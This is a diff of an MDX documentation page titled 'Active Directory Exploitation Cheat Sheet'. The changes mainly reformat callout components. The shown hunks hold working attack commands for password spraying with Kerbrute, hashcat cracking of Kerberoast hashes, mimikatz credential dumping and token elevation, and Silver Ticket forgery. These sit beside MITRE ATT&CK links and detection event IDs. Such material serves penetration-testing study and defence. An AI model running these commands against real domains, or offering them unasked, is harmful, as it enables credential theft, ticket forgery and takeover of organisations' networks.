@@ -1,22 +1,24 @@
 ---
-title: Active Directory Exploitation Cheat Sheet
-description: A comprehensive guide for attacking Active Directory environments, covering initial access, credential theft, ticket forgery, and lateral movement.
+title: "Active Directory Exploitation Cheat Sheet"
+description: "A comprehensive guide for attacking Active Directory environments, covering initial access, credential theft, ticket forgery, and lateral movement."
 ---
 
 # Active Directory Exploitation Cheat Sheet
 
-<Callout type="info" title="Overview">
-A comprehensive guide for attacking Active Directory environments. This note covers initial access (Brute Force/Spraying), credential theft (AS-REP Roasting, Kerberoasting, DCSync), ticket forgery (Golden/Silver Tickets), lateral movement (Pass-the-Hash), and domain persistence (Shadow Copy/NTDS extraction).
-</Callout>
+<Info>
+  A comprehensive guide for attacking Active Directory environments. This note covers initial access (Brute Force/Spraying), credential theft (AS-REP Roasting, Kerberoasting, DCSync), ticket forgery (Golden/Silver Tickets), lateral movement (Pass-the-Hash), and domain persistence (Shadow Copy/NTDS extraction).
+</Info>
 
 <CardGroup cols={3}>
-  <Card title="OCD Mindmaps" href="https://orange-cyberdefense.github.io/ocd-mindmaps" icon="external-link">
+  <Card title="OCD Mindmaps" icon="external-link" href="https://orange-cyberdefense.github.io/ocd-mindmaps">
     Visual mindmaps for Active Directory attacks.
   </Card>
-  <Card title="S1ckB0y AD Cheat Sheet" href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet" icon="github">
+
+  <Card title="S1ckB0y AD Cheat Sheet" icon="github" href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">
     Comprehensive GitHub reference for AD exploitation.
   </Card>
-  <Card title="PowerSploit Docs" href="https://powersploit.readthedocs.io/en/latest/Recon" icon="book">
+
+  <Card title="PowerSploit Docs" icon="book" href="https://powersploit.readthedocs.io/en/latest/Recon">
     Official PowerSploit documentation.
   </Card>
 </CardGroup>
@@ -42,32 +44,34 @@ Attempting to guess passwords for multiple accounts while avoiding account locko
     ```
   </Tab>
   <Tab title="Kerbrute">
-    *Uses TGT authentication for password spraying. Very fast and stealthy.*
+    _Uses TGT authentication for password spraying. Very fast and stealthy._
+
     ```cmd
     .\kerbrute.exe passwordspray .\username.txt "12345678" -d sindad.local
     ```
   </Tab>
 </Tabs>
 
-<Callout type="tip" title="Remote Desktop Protocol (RDP)">
-Connect to target via RDP from Linux.
-```bash
-xfreerdp /u:username /d:domain.com /v:iptarget
-```
-</Callout>
+<Tip>
+  Connect to target via RDP from Linux.
+
+  ```bash
+  xfreerdp /u:username /d:domain.com /v:iptarget
+  ```
+</Tip>
 
 ---
 
 ## AS-REP Roasting
 
-<Callout type="warning" title="Concept & Detection">
-**Attack Concept:** If Kerberos Pre-Authentication is disabled for a user, an attacker can send an AS-REQ to the KDC and receive an AS-REP containing a message encrypted with the user's password hash, which can be cracked offline.
-**MITRE ATT&CK:** [T1558.004 - AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
+<Warning>
+  **Attack Concept:** If Kerberos Pre-Authentication is disabled for a user, an attacker can send an AS-REQ to the KDC and receive an AS-REP containing a message encrypted with the user's password hash, which can be cracked offline. **MITRE ATT&CK:** [T1558.004 - AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
 
-**Detection (Event Logs):**
-* **Event 4738:** User account changed (Ticket Encryption Type 0x17, Service Name krbtgt).
-* **Event 5136:** Directory service object modified (Pre-auth setting changed).
-</Callout>
+  **Detection (Event Logs):**
+
+  - **Event 4738:** User account changed (Ticket Encryption Type 0x17, Service Name krbtgt).
+  - **Event 5136:** Directory service object modified (Pre-auth setting changed).
+</Warning>
 
 <Steps>
   <Step title="Step 1: Pre-Authentication Check (PowerView)">
@@ -103,11 +107,9 @@ xfreerdp /u:username /d:domain.com /v:iptarget
 
 ## Kerberoasting
 
-<Callout type="warning" title="Concept">
-**Attack Concept:** Attackers abuse a valid TGT to request a TGS ticket for a service running on behalf of a user account. The TGS ticket contains a portion encrypted with the service account's password hash, which can be cracked offline. Target is services (SPNs).
-**MITRE ATT&CK:** [T1558.003 - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
-**Prerequisite:** Must be joined to the domain.
-</Callout>
+<Warning>
+  **Attack Concept:** Attackers abuse a valid TGT to request a TGS ticket for a service running on behalf of a user account. The TGS ticket contains a portion encrypted with the service account's password hash, which can be cracked offline. Target is services (SPNs). **MITRE ATT&CK:** [T1558.003 - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) **Prerequisite:** Must be joined to the domain.
+</Warning>
 
 <Steps>
   <Step title="Step 1: Find SPNs">
@@ -143,7 +145,7 @@ xfreerdp /u:username /d:domain.com /v:iptarget
     ```bash
     # Hashcat (Mode 13100 for TGS)
     hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
-
+    
     # Python script (Alternative)
     python3 tgsrepcrack.py .\wordlist.txt .\krbs.kirbi 
     ```
@@ -156,26 +158,23 @@ xfreerdp /u:username /d:domain.com /v:iptarget
 
 <Tabs>
   <Tab title="Silver Ticket">
-    <Callout type="danger">
-    **Requirements:** Domain SID, NTLM hash of the target service account.
-    **Concept:** Forges a TGS ticket directly, bypassing the KDC. Very stealthy.
-    </Callout>
+    <Danger>
+      **Requirements:** Domain SID, NTLM hash of the target service account. **Concept:** Forges a TGS ticket directly, bypassing the KDC. Very stealthy.
+    </Danger>
 
     ```cmd
     :: 1. Get Domain SID and Service Hash
     whoami /user
     mimikatz # sekurlsa::logonpasswords  :: copy service NTLM hash
-
+    
     :: 2. Forge Silver Ticket
     mimikatz # kerberos::golden /sid:domainsid /domain:adolf.local /target:hostservicehave.adolf.local /service:http /rc4:ntlmofservicehostname /ptt /user:realyuserindomain
     ```
   </Tab>
-
   <Tab title="Golden Ticket">
-    <Callout type="danger">
-    **Requirements:** KRBTGT hash, Domain SID.
-    **Concept:** Forges a TGT, granting persistent domain admin access even if the user's password is changed.
-    </Callout>
+    <Danger>
+      **Requirements:** KRBTGT hash, Domain SID. **Concept:** Forges a TGT, granting persistent domain admin access even if the user's password is changed.
+    </Danger>
 
     <Steps>
       <Step title="1. Get NTLM hash & Domain SID">
@@ -214,9 +213,8 @@ xfreerdp /u:username /d:domain.com /v:iptarget
 
 ## DCSync Attack
 
-<Callout type="error" title="Concept">
-Abuses the Directory Replication Service Remote Protocol (MS-DRSR) to mimic a Domain Controller and request password hashes for any user (e.g., krbtgt or Administrator).
-**MITRE ATT&CK:** [T1003.006 - OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
+<Callout>
+  Abuses the Directory Replication Service Remote Protocol (MS-DRSR) to mimic a Domain Controller and request password hashes for any user (e.g., krbtgt or Administrator). **MITRE ATT&CK:** [T1003.006 - OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
 </Callout>
 
 <Tabs>
@@ -241,22 +239,22 @@ Abuses the Directory Replication Service Remote Protocol (MS-DRSR) to mimic a Do
 
 ## Lateral Movement (Pass-the-Hash / Overpass-the-Hash)
 
-<Callout type="info" title="Enumeration & Token Manipulation">
-```powershell
-. .\powerview.ps1
-Get-Domain
-whoami /all
-Find-LocalAdminAccess
-
-# Token Manipulation (Steal Admin Token)
-. .\Invoke-TokenManiPulation.ps1
-Invoke-TokenManiPulation -Enumerate
-
-# Dump Credentials from memory
-. .\Invoke-Mimikatz.ps1
-Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' 
-```
-</Callout>
+<Info>
+  ```powershell
+  . .\powerview.ps1
+  Get-Domain
+  whoami /all
+  Find-LocalAdminAccess
+  
+  # Token Manipulation (Steal Admin Token)
+  . .\Invoke-TokenManiPulation.ps1
+  Invoke-TokenManiPulation -Enumerate
+  
+  # Dump Credentials from memory
+  . .\Invoke-Mimikatz.ps1
+  Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' 
+  ```
+</Info>
 
 <Steps>
   <Step title="Overpass-the-Hash (Turn NTLM into Kerberos TGT)">
@@ -303,9 +301,9 @@ Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Domain Persistence: NTDS.dit Extraction
 
-<Callout type="warning" title="Shadow Copy (Stealing NTDS.dit)">
-**Concept:** The `ntds.dit` file on a Domain Controller contains all domain password hashes. It is locked by the system, so attackers use Volume Shadow Copies to extract it. Requires Domain Admin access.
-</Callout>
+<Warning>
+  **Concept:** The `ntds.dit` file on a Domain Controller contains all domain password hashes. It is locked by the system, so attackers use Volume Shadow Copies to extract it. Requires Domain Admin access.
+</Warning>
 
 <Tabs>
   <Tab title="Legacy Method (vshadow.exe)">
